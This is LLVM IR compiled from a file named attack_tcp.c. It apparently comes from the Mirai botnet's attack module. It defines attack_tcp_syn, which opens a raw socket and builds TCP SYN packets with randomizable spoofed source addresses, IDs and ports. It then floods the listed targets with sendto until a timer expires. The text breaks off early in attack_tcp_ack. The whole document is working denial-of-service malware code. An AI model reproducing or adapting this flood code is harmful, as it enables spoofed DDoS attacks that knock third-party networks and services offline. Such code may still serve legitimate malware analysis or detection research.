; ModuleID = 'attack_tcp.c'
source_filename = "attack_tcp.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-pc-linux-gnu"

%struct.attack_target = type { %struct.sockaddr_in, i32, i8 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.attack_option = type { i8*, i8 }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%union.__CONST_SOCKADDR_ARG = type { %struct.sockaddr* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.attack_stomp_data = type { i32, i32, i32, i16, i16 }
%union.__SOCKADDR_ARG = type { %struct.sockaddr* }

@LOCAL_ADDR = dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @attack_tcp_syn(i32 %0, i8 zeroext %1, %struct.attack_target* %2, i8 zeroext %3, %struct.attack_option* %4) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i8, align 1
  %27 = alloca i8, align 1
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca %struct.iphdr*, align 8
  %31 = alloca %struct.tcphdr*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca i8*, align 8
  %34 = alloca %struct.iphdr*, align 8
  %35 = alloca %struct.tcphdr*, align 8
  %36 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %37 = load i8, i8* %7, align 1
  %38 = zext i8 %37 to i64
  %39 = call noalias align 16 i8* @calloc(i64 %38, i64 8) #4
  %40 = bitcast i8* %39 to i8**
  store i8** %40, i8*** %13, align 8
  %41 = load i8, i8* %9, align 1
  %42 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %43 = call i32 @attack_get_opt_int(i8 zeroext %41, %struct.attack_option* %42, i8 zeroext 2, i32 0)
  %44 = trunc i32 %43 to i8
  store i8 %44, i8* %14, align 1
  %45 = load i8, i8* %9, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 3, i32 65535)
  %48 = trunc i32 %47 to i16
  store i16 %48, i16* %15, align 2
  %49 = load i8, i8* %9, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 4, i32 64)
  %52 = trunc i32 %51 to i8
  store i8 %52, i8* %16, align 1
  %53 = load i8, i8* %9, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 5, i32 1)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %17, align 1
  %57 = load i8, i8* %9, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 6, i32 65535)
  %60 = trunc i32 %59 to i16
  store i16 %60, i16* %18, align 2
  %61 = load i8, i8* %9, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 7, i32 65535)
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %19, align 2
  %65 = load i8, i8* %9, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 16, i32 65535)
  store i32 %67, i32* %20, align 4
  %68 = load i8, i8* %9, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 17, i32 0)
  store i32 %70, i32* %21, align 4
  %71 = load i8, i8* %9, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 10, i32 0)
  %74 = trunc i32 %73 to i8
  store i8 %74, i8* %22, align 1
  %75 = load i8, i8* %9, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %77 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 11, i32 0)
  %78 = trunc i32 %77 to i8
  store i8 %78, i8* %23, align 1
  %79 = load i8, i8* %9, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 12, i32 0)
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %24, align 1
  %83 = load i8, i8* %9, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %85 = call i32 @attack_get_opt_int(i8 zeroext %83, %struct.attack_option* %84, i8 zeroext 13, i32 0)
  %86 = trunc i32 %85 to i8
  store i8 %86, i8* %25, align 1
  %87 = load i8, i8* %9, align 1
  %88 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %89 = call i32 @attack_get_opt_int(i8 zeroext %87, %struct.attack_option* %88, i8 zeroext 14, i32 1)
  %90 = trunc i32 %89 to i8
  store i8 %90, i8* %26, align 1
  %91 = load i8, i8* %9, align 1
  %92 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %93 = call i32 @attack_get_opt_int(i8 zeroext %91, %struct.attack_option* %92, i8 zeroext 15, i32 0)
  %94 = trunc i32 %93 to i8
  store i8 %94, i8* %27, align 1
  %95 = load i8, i8* %9, align 1
  %96 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %97 = load i32, i32* @LOCAL_ADDR, align 4
  %98 = call i32 @attack_get_opt_ip(i8 zeroext %95, %struct.attack_option* %96, i8 zeroext 24, i32 %97)
  store i32 %98, i32* %28, align 4
  %99 = call i64 @time(i64* null) #4
  %100 = load i32, i32* %6, align 4
  %101 = sext i32 %100 to i64
  %102 = add nsw i64 %99, %101
  %103 = trunc i64 %102 to i32
  store i32 %103, i32* %29, align 4
  %104 = call i32 @socket(i32 2, i32 3, i32 6) #4
  store i32 %104, i32* %12, align 4
  %105 = icmp eq i32 %104, -1
  br i1 %105, label %106, label %107

106:                                              ; preds = %5
  br label %451

107:                                              ; preds = %5
  store i32 1, i32* %11, align 4
  %108 = load i32, i32* %12, align 4
  %109 = bitcast i32* %11 to i8*
  %110 = call i32 @setsockopt(i32 %108, i32 0, i32 3, i8* %109, i32 4) #4
  %111 = icmp eq i32 %110, -1
  br i1 %111, label %112, label %115

112:                                              ; preds = %107
  %113 = load i32, i32* %12, align 4
  %114 = call i32 @close(i32 %113)
  br label %451

115:                                              ; preds = %107
  store i32 0, i32* %11, align 4
  br label %116

116:                                              ; preds = %293, %115
  %117 = load i32, i32* %11, align 4
  %118 = load i8, i8* %7, align 1
  %119 = zext i8 %118 to i32
  %120 = icmp slt i32 %117, %119
  br i1 %120, label %121, label %296

121:                                              ; preds = %116
  %122 = call noalias align 16 i8* @calloc(i64 128, i64 1) #4
  %123 = load i8**, i8*** %13, align 8
  %124 = load i32, i32* %11, align 4
  %125 = sext i32 %124 to i64
  %126 = getelementptr inbounds i8*, i8** %123, i64 %125
  store i8* %122, i8** %126, align 8
  %127 = load i8**, i8*** %13, align 8
  %128 = load i32, i32* %11, align 4
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds i8*, i8** %127, i64 %129
  %131 = load i8*, i8** %130, align 8
  %132 = bitcast i8* %131 to %struct.iphdr*
  store %struct.iphdr* %132, %struct.iphdr** %30, align 8
  %133 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %134 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %133, i64 1
  %135 = bitcast %struct.iphdr* %134 to %struct.tcphdr*
  store %struct.tcphdr* %135, %struct.tcphdr** %31, align 8
  %136 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %137 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %136, i64 1
  %138 = bitcast %struct.tcphdr* %137 to i8*
  store i8* %138, i8** %32, align 8
  %139 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %140 = bitcast %struct.iphdr* %139 to i8*
  %141 = load i8, i8* %140, align 4
  %142 = and i8 %141, 15
  %143 = or i8 %142, 64
  store i8 %143, i8* %140, align 4
  %144 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %145 = bitcast %struct.iphdr* %144 to i8*
  %146 = load i8, i8* %145, align 4
  %147 = and i8 %146, -16
  %148 = or i8 %147, 5
  store i8 %148, i8* %145, align 4
  %149 = load i8, i8* %14, align 1
  %150 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %151 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %150, i32 0, i32 1
  store i8 %149, i8* %151, align 1
  %152 = call zeroext i16 @htons(i16 zeroext 60) #5
  %153 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %154 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %153, i32 0, i32 2
  store i16 %152, i16* %154, align 2
  %155 = load i16, i16* %15, align 2
  %156 = call zeroext i16 @htons(i16 zeroext %155) #5
  %157 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %158 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %157, i32 0, i32 3
  store i16 %156, i16* %158, align 4
  %159 = load i8, i8* %16, align 1
  %160 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %161 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %160, i32 0, i32 5
  store i8 %159, i8* %161, align 4
  %162 = load i8, i8* %17, align 1
  %163 = icmp ne i8 %162, 0
  br i1 %163, label %164, label %168

164:                                              ; preds = %121
  %165 = call zeroext i16 @htons(i16 zeroext 16384) #5
  %166 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %167 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %166, i32 0, i32 4
  store i16 %165, i16* %167, align 2
  br label %168

168:                                              ; preds = %164, %121
  %169 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %170 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %169, i32 0, i32 6
  store i8 6, i8* %170, align 1
  %171 = load i32, i32* %28, align 4
  %172 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %173 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %172, i32 0, i32 8
  store i32 %171, i32* %173, align 4
  %174 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %175 = load i32, i32* %11, align 4
  %176 = sext i32 %175 to i64
  %177 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %174, i64 %176
  %178 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %177, i32 0, i32 1
  %179 = load i32, i32* %178, align 4
  %180 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %181 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %180, i32 0, i32 9
  store i32 %179, i32* %181, align 4
  %182 = load i16, i16* %18, align 2
  %183 = call zeroext i16 @htons(i16 zeroext %182) #5
  %184 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %185 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %184, i32 0, i32 0
  store i16 %183, i16* %185, align 4
  %186 = load i16, i16* %19, align 2
  %187 = call zeroext i16 @htons(i16 zeroext %186) #5
  %188 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %189 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %188, i32 0, i32 1
  store i16 %187, i16* %189, align 2
  %190 = load i32, i32* %20, align 4
  %191 = trunc i32 %190 to i16
  %192 = call zeroext i16 @htons(i16 zeroext %191) #5
  %193 = zext i16 %192 to i32
  %194 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %195 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %194, i32 0, i32 2
  store i32 %193, i32* %195, align 4
  %196 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %197 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %196, i32 0, i32 4
  %198 = load i16, i16* %197, align 4
  %199 = and i16 %198, -241
  %200 = or i16 %199, 160
  store i16 %200, i16* %197, align 4
  %201 = load i8, i8* %22, align 1
  %202 = sext i8 %201 to i16
  %203 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %204 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %203, i32 0, i32 4
  %205 = load i16, i16* %204, align 4
  %206 = and i16 %202, 1
  %207 = shl i16 %206, 13
  %208 = and i16 %205, -8193
  %209 = or i16 %208, %207
  store i16 %209, i16* %204, align 4
  %210 = load i8, i8* %23, align 1
  %211 = sext i8 %210 to i16
  %212 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %213 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %212, i32 0, i32 4
  %214 = load i16, i16* %213, align 4
  %215 = and i16 %211, 1
  %216 = shl i16 %215, 12
  %217 = and i16 %214, -4097
  %218 = or i16 %217, %216
  store i16 %218, i16* %213, align 4
  %219 = load i8, i8* %24, align 1
  %220 = sext i8 %219 to i16
  %221 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %222 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %221, i32 0, i32 4
  %223 = load i16, i16* %222, align 4
  %224 = and i16 %220, 1
  %225 = shl i16 %224, 11
  %226 = and i16 %223, -2049
  %227 = or i16 %226, %225
  store i16 %227, i16* %222, align 4
  %228 = load i8, i8* %25, align 1
  %229 = sext i8 %228 to i16
  %230 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %231 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %230, i32 0, i32 4
  %232 = load i16, i16* %231, align 4
  %233 = and i16 %229, 1
  %234 = shl i16 %233, 10
  %235 = and i16 %232, -1025
  %236 = or i16 %235, %234
  store i16 %236, i16* %231, align 4
  %237 = load i8, i8* %26, align 1
  %238 = sext i8 %237 to i16
  %239 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %240 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %239, i32 0, i32 4
  %241 = load i16, i16* %240, align 4
  %242 = and i16 %238, 1
  %243 = shl i16 %242, 9
  %244 = and i16 %241, -513
  %245 = or i16 %244, %243
  store i16 %245, i16* %240, align 4
  %246 = load i8, i8* %27, align 1
  %247 = sext i8 %246 to i16
  %248 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %249 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %248, i32 0, i32 4
  %250 = load i16, i16* %249, align 4
  %251 = and i16 %247, 1
  %252 = shl i16 %251, 8
  %253 = and i16 %250, -257
  %254 = or i16 %253, %252
  store i16 %254, i16* %249, align 4
  %255 = load i8*, i8** %32, align 8
  %256 = getelementptr inbounds i8, i8* %255, i32 1
  store i8* %256, i8** %32, align 8
  store i8 2, i8* %255, align 1
  %257 = load i8*, i8** %32, align 8
  %258 = getelementptr inbounds i8, i8* %257, i32 1
  store i8* %258, i8** %32, align 8
  store i8 4, i8* %257, align 1
  %259 = call i32 @rand_next()
  %260 = and i32 %259, 15
  %261 = add i32 1400, %260
  %262 = trunc i32 %261 to i16
  %263 = call zeroext i16 @htons(i16 zeroext %262) #5
  %264 = load i8*, i8** %32, align 8
  %265 = bitcast i8* %264 to i16*
  store i16 %263, i16* %265, align 2
  %266 = load i8*, i8** %32, align 8
  %267 = getelementptr inbounds i8, i8* %266, i64 2
  store i8* %267, i8** %32, align 8
  %268 = load i8*, i8** %32, align 8
  %269 = getelementptr inbounds i8, i8* %268, i32 1
  store i8* %269, i8** %32, align 8
  store i8 4, i8* %268, align 1
  %270 = load i8*, i8** %32, align 8
  %271 = getelementptr inbounds i8, i8* %270, i32 1
  store i8* %271, i8** %32, align 8
  store i8 2, i8* %270, align 1
  %272 = load i8*, i8** %32, align 8
  %273 = getelementptr inbounds i8, i8* %272, i32 1
  store i8* %273, i8** %32, align 8
  store i8 8, i8* %272, align 1
  %274 = load i8*, i8** %32, align 8
  %275 = getelementptr inbounds i8, i8* %274, i32 1
  store i8* %275, i8** %32, align 8
  store i8 10, i8* %274, align 1
  %276 = call i32 @rand_next()
  %277 = load i8*, i8** %32, align 8
  %278 = bitcast i8* %277 to i32*
  store i32 %276, i32* %278, align 4
  %279 = load i8*, i8** %32, align 8
  %280 = getelementptr inbounds i8, i8* %279, i64 4
  store i8* %280, i8** %32, align 8
  %281 = load i8*, i8** %32, align 8
  %282 = bitcast i8* %281 to i32*
  store i32 0, i32* %282, align 4
  %283 = load i8*, i8** %32, align 8
  %284 = getelementptr inbounds i8, i8* %283, i64 4
  store i8* %284, i8** %32, align 8
  %285 = load i8*, i8** %32, align 8
  %286 = getelementptr inbounds i8, i8* %285, i32 1
  store i8* %286, i8** %32, align 8
  store i8 1, i8* %285, align 1
  %287 = load i8*, i8** %32, align 8
  %288 = getelementptr inbounds i8, i8* %287, i32 1
  store i8* %288, i8** %32, align 8
  store i8 3, i8* %287, align 1
  %289 = load i8*, i8** %32, align 8
  %290 = getelementptr inbounds i8, i8* %289, i32 1
  store i8* %290, i8** %32, align 8
  store i8 3, i8* %289, align 1
  %291 = load i8*, i8** %32, align 8
  %292 = getelementptr inbounds i8, i8* %291, i32 1
  store i8* %292, i8** %32, align 8
  store i8 6, i8* %291, align 1
  br label %293

293:                                              ; preds = %168
  %294 = load i32, i32* %11, align 4
  %295 = add nsw i32 %294, 1
  store i32 %295, i32* %11, align 4
  br label %116, !llvm.loop !6

296:                                              ; preds = %116
  br label %297

297:                                              ; preds = %296, %450
  store i32 0, i32* %11, align 4
  br label %298

298:                                              ; preds = %441, %297
  %299 = load i32, i32* %11, align 4
  %300 = load i8, i8* %7, align 1
  %301 = zext i8 %300 to i32
  %302 = icmp slt i32 %299, %301
  br i1 %302, label %303, label %444

303:                                              ; preds = %298
  %304 = load i8**, i8*** %13, align 8
  %305 = load i32, i32* %11, align 4
  %306 = sext i32 %305 to i64
  %307 = getelementptr inbounds i8*, i8** %304, i64 %306
  %308 = load i8*, i8** %307, align 8
  store i8* %308, i8** %33, align 8
  %309 = load i8*, i8** %33, align 8
  %310 = bitcast i8* %309 to %struct.iphdr*
  store %struct.iphdr* %310, %struct.iphdr** %34, align 8
  %311 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %312 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %311, i64 1
  %313 = bitcast %struct.iphdr* %312 to %struct.tcphdr*
  store %struct.tcphdr* %313, %struct.tcphdr** %35, align 8
  %314 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %315 = load i32, i32* %11, align 4
  %316 = sext i32 %315 to i64
  %317 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %314, i64 %316
  %318 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %317, i32 0, i32 2
  %319 = load i8, i8* %318, align 4
  %320 = zext i8 %319 to i32
  %321 = icmp slt i32 %320, 32
  br i1 %321, label %322, label %343

322:                                              ; preds = %303
  %323 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %324 = load i32, i32* %11, align 4
  %325 = sext i32 %324 to i64
  %326 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %323, i64 %325
  %327 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %326, i32 0, i32 1
  %328 = load i32, i32* %327, align 4
  %329 = call i32 @ntohl(i32 %328) #5
  %330 = call i32 @rand_next()
  %331 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %332 = load i32, i32* %11, align 4
  %333 = sext i32 %332 to i64
  %334 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %331, i64 %333
  %335 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %334, i32 0, i32 2
  %336 = load i8, i8* %335, align 4
  %337 = zext i8 %336 to i32
  %338 = lshr i32 %330, %337
  %339 = add i32 %329, %338
  %340 = call i32 @htonl(i32 %339) #5
  %341 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %342 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %341, i32 0, i32 9
  store i32 %340, i32* %342, align 4
  br label %343

343:                                              ; preds = %322, %303
  %344 = load i32, i32* %28, align 4
  %345 = icmp eq i32 %344, -1
  br i1 %345, label %346, label %350

346:                                              ; preds = %343
  %347 = call i32 @rand_next()
  %348 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %349 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %348, i32 0, i32 8
  store i32 %347, i32* %349, align 4
  br label %350

350:                                              ; preds = %346, %343
  %351 = load i16, i16* %15, align 2
  %352 = zext i16 %351 to i32
  %353 = icmp eq i32 %352, 65535
  br i1 %353, label %354, label %360

354:                                              ; preds = %350
  %355 = call i32 @rand_next()
  %356 = and i32 %355, 65535
  %357 = trunc i32 %356 to i16
  %358 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %359 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %358, i32 0, i32 3
  store i16 %357, i16* %359, align 4
  br label %360

360:                                              ; preds = %354, %350
  %361 = load i16, i16* %18, align 2
  %362 = zext i16 %361 to i32
  %363 = icmp eq i32 %362, 65535
  br i1 %363, label %364, label %370

364:                                              ; preds = %360
  %365 = call i32 @rand_next()
  %366 = and i32 %365, 65535
  %367 = trunc i32 %366 to i16
  %368 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %369 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %368, i32 0, i32 0
  store i16 %367, i16* %369, align 4
  br label %370

370:                                              ; preds = %364, %360
  %371 = load i16, i16* %19, align 2
  %372 = zext i16 %371 to i32
  %373 = icmp eq i32 %372, 65535
  br i1 %373, label %374, label %380

374:                                              ; preds = %370
  %375 = call i32 @rand_next()
  %376 = and i32 %375, 65535
  %377 = trunc i32 %376 to i16
  %378 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %379 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %378, i32 0, i32 1
  store i16 %377, i16* %379, align 2
  br label %380

380:                                              ; preds = %374, %370
  %381 = load i32, i32* %20, align 4
  %382 = icmp eq i32 %381, 65535
  br i1 %382, label %383, label %387

383:                                              ; preds = %380
  %384 = call i32 @rand_next()
  %385 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %386 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %385, i32 0, i32 2
  store i32 %384, i32* %386, align 4
  br label %387

387:                                              ; preds = %383, %380
  %388 = load i32, i32* %21, align 4
  %389 = icmp eq i32 %388, 65535
  br i1 %389, label %390, label %394

390:                                              ; preds = %387
  %391 = call i32 @rand_next()
  %392 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %393 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %392, i32 0, i32 3
  store i32 %391, i32* %393, align 4
  br label %394

394:                                              ; preds = %390, %387
  %395 = load i8, i8* %22, align 1
  %396 = icmp ne i8 %395, 0
  br i1 %396, label %397, label %403

397:                                              ; preds = %394
  %398 = call i32 @rand_next()
  %399 = and i32 %398, 65535
  %400 = trunc i32 %399 to i16
  %401 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %402 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %401, i32 0, i32 7
  store i16 %400, i16* %402, align 2
  br label %403

403:                                              ; preds = %397, %394
  %404 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %405 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %404, i32 0, i32 7
  store i16 0, i16* %405, align 2
  %406 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %407 = bitcast %struct.iphdr* %406 to i16*
  %408 = call zeroext i16 @checksum_generic(i16* %407, i32 20)
  %409 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %410 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %409, i32 0, i32 7
  store i16 %408, i16* %410, align 2
  %411 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %412 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %411, i32 0, i32 6
  store i16 0, i16* %412, align 4
  %413 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %414 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %415 = bitcast %struct.tcphdr* %414 to i8*
  %416 = call zeroext i16 @htons(i16 zeroext 40) #5
  %417 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %413, i8* %415, i16 zeroext %416, i32 40)
  %418 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %419 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %418, i32 0, i32 6
  store i16 %417, i16* %419, align 4
  %420 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %421 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %420, i32 0, i32 1
  %422 = load i16, i16* %421, align 2
  %423 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %424 = load i32, i32* %11, align 4
  %425 = sext i32 %424 to i64
  %426 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %423, i64 %425
  %427 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %426, i32 0, i32 0
  %428 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %427, i32 0, i32 1
  store i16 %422, i16* %428, align 2
  %429 = load i32, i32* %12, align 4
  %430 = load i8*, i8** %33, align 8
  %431 = bitcast %union.__CONST_SOCKADDR_ARG* %36 to %struct.sockaddr**
  %432 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %433 = load i32, i32* %11, align 4
  %434 = sext i32 %433 to i64
  %435 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %432, i64 %434
  %436 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %435, i32 0, i32 0
  %437 = bitcast %struct.sockaddr_in* %436 to %struct.sockaddr*
  store %struct.sockaddr* %437, %struct.sockaddr** %431, align 8
  %438 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %36, i32 0, i32 0
  %439 = load %struct.sockaddr*, %struct.sockaddr** %438, align 8
  %440 = call i64 @sendto(i32 %429, i8* %430, i64 60, i32 16384, %struct.sockaddr* %439, i32 16)
  br label %441

441:                                              ; preds = %403
  %442 = load i32, i32* %11, align 4
  %443 = add nsw i32 %442, 1
  store i32 %443, i32* %11, align 4
  br label %298, !llvm.loop !8

444:                                              ; preds = %298
  %445 = call i64 @time(i64* null) #4
  %446 = load i32, i32* %29, align 4
  %447 = sext i32 %446 to i64
  %448 = icmp sgt i64 %445, %447
  br i1 %448, label %449, label %450

449:                                              ; preds = %444
  br label %451

450:                                              ; preds = %444
  br label %297

451:                                              ; preds = %106, %112, %449
  ret void
}

; Function Attrs: nounwind
declare noalias align 16 i8* @calloc(i64, i64) #1

declare i32 @attack_get_opt_int(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #2

declare i32 @attack_get_opt_ip(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #2

; Function Attrs: nounwind
declare i64 @time(i64*) #1

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #1

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #1

declare i32 @close(i32) #2

; Function Attrs: nounwind readnone willreturn
declare zeroext i16 @htons(i16 zeroext) #3

declare i32 @rand_next() #2

; Function Attrs: nounwind readnone willreturn
declare i32 @htonl(i32) #3

; Function Attrs: nounwind readnone willreturn
declare i32 @ntohl(i32) #3

declare zeroext i16 @checksum_generic(i16*, i32) #2

declare zeroext i16 @checksum_tcpudp(%struct.iphdr*, i8*, i16 zeroext, i32) #2

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @attack_tcp_ack(i32 %0, i8 zeroext %1, %struct.attack_target* %2, i8 zeroext %3, %struct.attack_option* %4) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i8, align 1
  %27 = alloca i8, align 1
  %28 = alloca i32, align 4
